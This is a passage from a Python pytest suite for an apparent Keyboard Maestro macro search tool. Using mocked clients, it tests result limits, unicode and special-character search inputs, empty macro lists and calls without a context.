    @pytest.mark.asyncio
    async def test_search_memory_efficiency(self, mock_context, mock_km_client) -> None:
        """Test that search doesn't consume excessive memory."""
        # Setup
        macro_list = []
        for i in range(100):
            macro_list.append(
                {
                    "id": f"macro-{i:04d}",
                    "name": f"Test Macro {i}",
                    "enabled": True,
                    "group": "Test Group",
                    "trigger_count": 1,
                    "action_count": 2,
                    "creation_date": "2024-01-01T00:00:00Z",
                    "modification_date": "2024-12-01T00:00:00Z",
                    "last_used": "2024-12-01T10:00:00Z",
                    "used_count": 1,
                },
            )

        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            macro_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute multiple searches to test memory usage
            results = []
            for _i in range(10):
                result = await km_search_actions(limit=20, ctx=mock_context)
                results.append(result)

            # Verify all searches succeeded
            for result in results:
                assert result["success"] is True
                assert len(result["data"]["actions"]) <= 20

            # Memory usage should be reasonable (this is a basic check)
            # In a real scenario, you might use memory profiling tools
            assert len(results) == 10


# Additional integration tests for edge cases
class TestSearchToolsEdgeCases:
    """Test edge cases and boundary conditions."""

    @pytest.mark.asyncio
    async def test_search_with_unicode_content(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test search with unicode characters in content."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        unicode_content = "测试内容 🚀 àáâãäå"

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(
                content_search=unicode_content,
                ctx=mock_context,
            )

            # Verify
            assert result["success"] is True
            assert (
                result["data"]["search_criteria"]["content_search"] == unicode_content
            )

    @pytest.mark.asyncio
    async def test_search_with_empty_macro_list(self, mock_context, mock_km_client) -> None:
        """Test search with empty macro list."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = []

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(ctx=mock_context)

            # Verify
            assert result["success"] is True
            assert result["data"]["total_found"] == 0
            assert result["data"]["actions"] == []

    @pytest.mark.asyncio
    async def test_search_without_context(self, mock_km_client, sample_macros_list) -> None:
        """Test search without providing context."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions()

            # Verify
            assert result["success"] is True
            assert "data" in result
            assert "actions" in result["data"]

    @pytest.mark.asyncio
    async def test_search_with_special_characters_in_filters(
        self,
        mock_context,
        mock_km_client,
        sample_macros_list,
    ) -> None:
        """Test search with special characters in filter parameters."""
        # Setup
        mock_km_client.list_macros_with_details.return_value = Mock()
        mock_km_client.list_macros_with_details.return_value.is_left.return_value = (
            False
        )
        mock_km_client.list_macros_with_details.return_value.get_right.return_value = (
            sample_macros_list
        )

        special_chars = "!@#$%^&*()_+-=[]{}|;:'\",.<>?"

        with patch(
            "src.server.tools.search_tools.get_km_client",
            return_value=mock_km_client,
        ):
            # Execute
            result = await km_search_actions(
                macro_filter=special_chars,
                content_search=special_chars,
                ctx=mock_context,
            )

            # Verify - should handle gracefully
            assert result["success"] is True
            assert result["data"]["search_criteria"]["macro_filter"] == special_chars
            assert result["data"]["search_criteria"]["content_search"] == special_chars
